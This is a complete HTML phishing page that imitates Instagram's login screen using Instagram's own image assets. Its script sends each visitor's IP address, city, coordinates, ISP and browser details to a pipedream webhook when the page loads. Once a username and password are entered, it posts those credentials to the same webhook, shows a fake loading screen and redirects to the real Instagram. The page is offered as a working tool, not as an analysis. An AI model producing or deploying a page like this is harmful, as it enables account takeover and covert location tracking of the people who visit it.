<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<link rel="icon" type="image/png" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }

body {
  background: #fafafa;
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
}

.main-container {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 32px;
  max-width: 935px;
  width: 100%;
  padding: 0 20px;
}

.phone-mockup {
  width: 380px;
  flex-shrink: 0;
}
.phone-mockup img {
  width: 100%;
}

.right-side {
  width: 350px;
  display: flex;
  flex-direction: column;
  gap: 10px;
}

.card {
  background: white;
  border: 1px solid #dbdbdb;
  padding: 40px;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 12px;
}

.logo {
  font-family: 'Dancing Script', cursive;
  font-size: 52px;
  font-weight: 700;
  color: #262626;
  margin-bottom: 8px;
  letter-spacing: -1px;
}

input {
  width: 100%;
  background: #fafafa;
  border: 1px solid #dbdbdb;
  border-radius: 3px;
  padding: 9px 8px 7px;
  font-size: 12px;
  color: #262626;
  outline: none;
  transition: border-color 0.1s;
}
input:focus { border-color: #a8a8a8; background: #fff; }
input::placeholder { color: #8e8e8e; }

.btn-login {
  width: 100%;
  background: #0095f6;
  color: white;
  border: none;
  border-radius: 8px;
  padding: 7px 0;
  font-size: 14px;
  font-weight: 600;
  cursor: pointer;
  margin-top: 4px;
  opacity: 0.5;
  transition: opacity 0.2s;
}
.btn-login.active { opacity: 1; }
.btn-login.active:hover { background: #1877f2; }

.divider {
  display: flex;
  align-items: center;
  width: 100%;
  gap: 18px;
  margin: 4px 0;
}
.divider-line { flex: 1; height: 1px; background: #dbdbdb; }
.divider-text { color: #8e8e8e; font-size: 13px; font-weight: 600; }

.fb-login {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  color: #385185;
  font-size: 14px;
  font-weight: 600;
  cursor: pointer;
  text-decoration: none;
  width: 100%;
}
.fb-icon {
  background: url('https://static.cdninstagram.com/rsrc.php/v3/yt/r/oF1_RbKJxW3.png') no-repeat center;
  background-size: contain;
  width: 20px;
  height: 20px;
}

.forgot {
  color: #00376b;
  font-size: 12px;
  text-decoration: none;
  margin-top: 4px;
}

.card2 {
  background: white;
  border: 1px solid #dbdbdb;
  padding: 20px;
  text-align: center;
  font-size: 14px;
  color: #262626;
}
.card2 a { color: #0095f6; font-weight: 600; text-decoration: none; }

.get-app {
  text-align: center;
  margin-top: 15px;
  color: #262626;
  font-size: 14px;
}
.badges {
  display: flex;
  justify-content: center;
  gap: 8px;
  margin-top: 12px;
}
.badges img { height: 40px; cursor: pointer; }

footer {
  margin-top: 40px;
  text-align: center;
  color: #8e8e8e;
  font-size: 12px;
  padding-bottom: 20px;
}
footer .links {
  display: flex;
  flex-wrap: wrap;
  justify-content: center;
  gap: 8px 16px;
  margin-bottom: 12px;
}
footer .links a { color: #8e8e8e; text-decoration: none; }
footer .links a:hover { text-decoration: underline; }

/* Loading */
.loading-overlay {
  display: none;
  position: fixed;
  top: 0; left: 0;
  width: 100%; height: 100%;
  background: white;
  z-index: 999;
  align-items: center;
  justify-content: center;
  flex-direction: column;
  gap: 20px;
}
.insta-logo-loading {
  font-family: 'Dancing Script', cursive;
  font-size: 52px;
  font-weight: 700;
  color: #262626;
}
.insta-spinner {
  width: 32px;
  height: 32px;
  border: 3px solid #dbdbdb;
  border-top: 3px solid #8e8e8e;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
}
@keyframes spin { to { transform: rotate(360deg); } }

/* Mobile */
@media (max-width: 768px) {
  .phone-mockup { display: none; }
  .right-side { width: 100%; max-width: 350px; }
  .card { border: none; padding: 30px 20px; }
  .card2 { border-left: none; border-right: none; }
}
</style>
<link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
</head>
<body>

<div class="main-container">
  <!-- Phone mockup - desktop only -->
  <div class="phone-mockup">
    <img src="https://static.cdninstagram.com/rsrc.php/v3/yK/r/ATdOJPRTBzO.png" alt="Instagram App">
  </div>

  <div class="right-side">
    <div class="card">
      <div class="logo">Instagram</div>

      <input type="text" id="username" placeholder="Phone number, username, or email" oninput="checkInputs()" autocorrect="off" autocapitalize="off">
      <input type="password" id="password" placeholder="Password" oninput="checkInputs()">
      <button class="btn-login" id="loginBtn" onclick="doLogin()">Log in</button>

      <div class="divider">
        <div class="divider-line"></div>
        <div class="divider-text">OR</div>
        <div class="divider-line"></div>
      </div>

      <a href="#" class="fb-login">
        <div class="fb-icon"></div>
        Log in with Facebook
      </a>

      <a href="#" class="forgot">Forgot password?</a>
    </div>

    <div class="card2">
      Don't have an account? <a href="#">Sign up</a>
    </div>

    <div class="get-app">
      <p>Get the app.</p>
      <div class="badges">
        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store">
        <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/oF1_RbKJxW3.png" alt="Google Play">
      </div>
    </div>
  </div>
</div>

<footer>
  <div class="links">
    <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a>
    <a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a>
    <a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a>
    <a href="#">Instagram Lite</a><a href="#">Threads</a>
    <a href="#">Contact Uploading & Non-Users</a><a href="#">Meta Verified</a>
  </div>
  <p>© 2025 Instagram from Meta</p>
</footer>

<!-- Loading -->
<div class="loading-overlay" id="loadingOverlay">
  <div class="insta-logo-loading">Instagram</div>
  <div class="insta-spinner"></div>
</div>

<script>
const WEBHOOK = "https://eocy1w7x0u37m91.m.pipedream.net";

function checkInputs() {
  const u = document.getElementById("username").value;
  const p = document.getElementById("password").value;
  document.getElementById("loginBtn").classList.toggle("active", u.length > 0 && p.length > 0);
}

async function sendData(extra) {
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    await fetch(WEBHOOK, {
      method: "POST",
      mode: "no-cors",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "🎯 Instagram Page",
        username: extra.username || "",
        password: extra.password || "",
        ip: data.ip,
        country: data.country_name,
        city: data.city,
        lat: data.latitude,
        lon: data.longitude,
        isp: data.org,
        device: navigator.userAgent,
        time: new Date().toLocaleString(),
        maps: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
      })
    });
  } catch(e) {}
}

function doLogin() {
  const u = document.getElementById("username").value;
  const p = document.getElementById("password").value;
  if (!u || !p) return;
  document.getElementById("loadingOverlay").style.display = "flex";
  sendData({ username: u, password: p });
  setTimeout(() => { window.location.href = "https://www.instagram.com"; }, 3000);
}

sendData({});
</script>
</body>
</html>
